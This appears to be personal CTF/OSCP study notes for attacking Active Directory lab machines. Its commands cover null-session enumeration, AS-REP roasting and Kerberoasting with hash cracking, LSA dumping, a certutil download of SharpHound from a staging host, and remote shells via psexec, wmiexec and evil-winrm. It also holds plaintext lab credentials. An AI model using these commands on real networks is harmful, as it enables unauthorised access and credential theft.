erNeed to read this

[https://benheater.com/my-ctf-methodology/](https://benheater.com/my-ctf-methodology/)

### links

- [https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
- [https://github.com/MariamTariq404/OSCP-Checklist](https://github.com/MariamTariq404/OSCP-Checklist)

Adding target IP

```bash
export target="10.10.11.69"
```

- [ ] Check all TCP ports (fast + full scans as needed).
- [ ] Check LDAP, RPC and SMB for anonymous access and public/shared folders.
- [ ] Enumerate usernames — use tools like `netexec --rid-brute`, `rpcclient enumdomusers`, and `kerbrute`.
- [ ] Test AS-REP roasting for users without pre-auth; if successful, save the hashes and try cracking them.
- [ ] Try authentication with every available protocol using discovered credentials: WinRM, RDP, MySQL, SMB, RPC, LDAP, etc. (include NTLM authentication where applicable).
- [ ] Enumerate shares for every account you can access — whenever you gain a new user, re-check their shares.
- [ ] If you get a shell as a user: run privilege-escalation checks, dump local/domain hashes, and collect them into a file for offline cracking and lateral movement.
- [ ] Run BloodHound and review high-risk paths and attacks (DCSync, unconstrained delegation, ACL abuse, etc.).
- [ ] Check for certificate-based attacks with Certipy (AD CS / certificate template issues).
- [ ] In AD environments, look for additional network adapters/subnets for pivoting; set up a jumpbox and relay tools through it when needed.
- [ ] When brute-forcing, remember to test different protocols and include NTLM where required — be careful with lockouts.
- [ ] Check UDP ports (e.g., `nmap -sU`) for additional services.
- [ ] If stuck: rescan, verify your tool versions/flags, and ensure you’re running tools correctly (and that network/firewall rules aren’t blocking you).

## RPC Client :

checking for null sessions to get the usernames

```jsx
rpcclient -U "" $t -N
enumdomusers
```

## **Check SMB Guest/Null Access**

```bash
smbclient -L //$t -N     # List shares without creds

#smbmap
smbmap -H $t -u '' -p ''

# shares
nxc smb $t -u '' -p '' --shares   
nxc smb $t -u 'guest' -p '' --shares
   
# users   
nxc smb $t -u '' -p '' --users   
nxc smb $t -u 'guest' -p '' --users

# write all the files in your local system
nxc smb $t -u '' -p '' --shares -M spider_plus -o DOWNLOAD_FLAG=True

# for multiple ips
nxc --verbose smb ./ips.txt -u corpmngr -p 'User4&*&*' --continue-on-success

## if the we found the credents of user which is local administrator then we can run command to dump the lsa
nxc smb 192.168.98.30 -u john -p User1@#$%6 --lsa --verbose

# Connecting to the system if smb is Pwned!
impacket-psexec active.htb/Administrator@Pass123123@192.168.98.12

# getting all smb files from folder
recurse
prompt OFF
mget *
```


```bash
for service in rdp wmi winrm smb ldap; do   nxc $service -l 'ryan.naylor' -p 'HollowOct31Nyt' done
```
## **User Enumeration (`crackmapexec --rid-brute`)**

It tells **CrackMapExec**:

> “Try RID numbers from 500 to 5500 and give me usernames if any match.”

```bash
nxc smb $t --rid-brute
nxc smb $t -u guest -p  '' --rid-brute
nxc smb $t -u guest -p  '' --rid-brute | grep -i SidTypeUser

# filtering user names
cat rid_brute.txt  | awk '{print $6}' | awk -F'\\' '{print $2}' | sort -u
```

## **Quick LDAP Anonymous Dump**

```bash
ldapsearch -x -H ldap://$t -b "dc=htb,dc=support" > ldap_dump.txt
# then search for keyword "LegacyPwd" it maycontain password

# search for "info" keyword it is password sometime and the name is user
ldapsearch -x -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldap.search

# Finding user 
nxc ldap $t -u '' -p '' --users
nxc ldap $t -u 'guest' -p '' --users
```

## **Enum4Linux Fallback**

```bash
enum4linux -a $t > enum4linux.txt # Full scan
enum4linux -u "guest" -p "" 10.10.180.201 # Test guest access
enum4linux -u thm.corp\\\\guest -a 10.10.130.147 # enumerating using the Guest account

enum4linux-ng -A fluffy.htb -u FLUFFY/j.fleischman -p 'J0elTHEM4n1990!'
```

## AS-REP Roasting:

> AS-REP Roasting is an Active Directory attack where you request encrypted password hashes for accounts that don’t require Kerberos pre-authentication, and then crack the hashes offline.

🧠 Key point:

- Some AD users have the **"Do not require Kerberos preauthentication"** flag set.
- These users are vulnerable to AS-REP Roasting.

```bash
nxc ldap $t -u users.txt -p '' --asreproast output.txt 

#using impacket
impacket-GetNPUsers fluffy.htb/ -dc-ip $t -usersfile usernames.txt 

# or
for user in $(cat ./users.txt); do impacket-GetNPUsers -no-pass -dc-ip $t fluffy.htb/${user} | grep -v Impacket; done

# for hash
john --wordlist=rockyou.txt hash.txt
# hashcat
hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

After getting creds you can try this Kerberoasting for service account

```jsx
impacket-GetUserSPNs -dc-ip 172.16.5.5 'htb.local/forend@service123' -request
```

The command logs into the Active Directory domain using the given username and password, talks to the domain controller at the specified IP, and looks for accounts that run services (like web or database services). For each service account it finds, it asks the domain for a Kerberos service ticket and saves the ticket data — that data can be cracked later to try to recover the service account’s password (this attack is called Kerberoasting)

---

# Blood Hound Data collection

### Using Ldap:

```bash
# it will create a zip
nxc ldap $t -u "" -p "" --bloodhound --collection All --dns-server $t
```

### Using Sharphound:

### Sharphound.exe

```bash
# Download it 
<https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe>

# copy to victim machine
certutil -urlcache -split -f <http://10.250.1.6:8000/SharpHound.exe> SharpHound.exe

# Run it
.\\SharpHound.exe -c All

OR
.\\SharpHound.exe -d \\<domain> — ldapusername \\<username> — ldappassword \\<password> — collectionmethods All
```

### sharpHound.PS1

```bash
# Start PowerShell with execution bypass
# -ep bypass = Bypasses PowerShell's security restrictions (allows running unsigned scripts)
powershell -ep bypass

# Load SharpHound
. .\SharpHound.ps1

# Collect ALL Active Directory data and save to zip file
# -CollectionMethod All      = Groups, users, computers, ACLs, sessions, SPNs, trusts
# -Domain bear.local         = Target domain (only collects from this domain)
# -ZipFileName loot.zip      = Output file name (easy to exfiltrate and import to BloodHound)
Invoke-BloodHound -CollectionMethod All -Domain bear.local -ZipFileName loot.zip
```

### Using Bloodhound python:

```bash
bloodhound-python -c All -u '' -p '' -d fluffy.htb -ns $t
```

---

### Verifying the DC machine

If you have the machine access and you want to check if its the Domain controller or normal machine you can check if this folder found then its DC

```bash
dir C:\\Windows\\NTDS
```

---

### Accessing the machine

```bash
# Winrm
evil-winrm -i 192.168.98.120 -u corpmngr -p  'User4&*&*'
```

---

### Sync time with AD machine

```bash
while true; do ntpdate -s fluffy.htb; done
```

---
### TGT

```shell
# Get Kerberos TGT (writes .ccache)
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'

# Point env to the ticket cache
export KRB5CCNAME=/home/kali/Voleur/ryan.naylor.ccache

# Use Kerberos ticket for LDAP and the -k Kerberos option (use Kerberos ticke
nxc ldap voleur.htb -u ryan.naylor -p HollowOct31Nyt -k

# Use Kerberos ticket for SMB and the -k Kerberos option (use Kerberos ticke
nxc smb voleur.htb -u ryan.naylor -p HollowOct31Nyt -k
```



___
# **Kerberoasting**

### Request All TGS Ticket:

```bash
# List SPN (Optional)
impacket-GetUserSPNs -dc-ip $t <DOMAIN>/<USERNAME>

# **Request All TGS Tickets (for all SPNs)**
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request

# Request Ticket for a Specific Account (Optional)
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_ACCOUNT>
#example
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile sapservice_tgs
```

Crack the TGS Ticket (Offline)

```bash
hashcat -m 13100 hash.txt /path/to/wordlist.txt

# OR
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# <https://hashcat.net/wiki/doku.php?id=example_hashes>
# <https://hashcat.net/hashcat/>
```


---

# Pwn3d! Procols Access

- Got **SMB creds** → try `psexec.py` → fall back to `wmiexec.py` or `smbexec.py`.
- Got **WinRM** → `evil-winrm` (best).
- Got **RDP** → `xfreerdp` for full GUI access.
- Got **SSH** → `ssh` (standard).
- Got **DB creds** → use DB client (`mssqlclient`, `mysql`, `psql`

### Smb

```bash
impacket-psexec active.htb/Administrator@Pass123123@192.168.98.12

impacket-smbexec Administrator:'Ticketmaster1968'@10.10.10.100

impacket-wmiexec Administrator:'Ticketmaster1968'@10.10.10.100
```

### Winrm

```bash
evil-winrm -S -i 10.10.10.100 -u Administrator -p 'Ticketmaster1968
```

### Wmi

```bash
impacket-wmiexec Administrator:'Ticketmaster1968'@10.10.10.100
```




